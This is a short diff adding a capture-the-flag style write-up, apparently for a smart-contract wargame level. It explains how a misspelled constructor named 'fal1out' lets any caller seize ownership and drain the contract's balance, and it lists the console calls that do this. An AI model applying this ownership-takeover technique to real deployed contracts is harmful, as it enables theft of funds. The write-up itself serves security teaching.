@@ -1,0 +1,12 @@
+There is a fatal error here, that is the constructor's name is misspelled , of course ,
+when the version of solidity is updated to 0.6.2,the function of constructor is used to replace the previous version.
+
+If we wanna get the Owner's permissions, we just only call the fal1out and make the permission exchange.
+After get the permission, we can call collectAllocations withdraw all the balance in this smart contract.
+
+await contract.owner()
+//check the owner at this time
+await contract.fal1out()
+//call this error func to change the permission
+await contract.owner()
+//check again the owner, you will see the permissions changed.
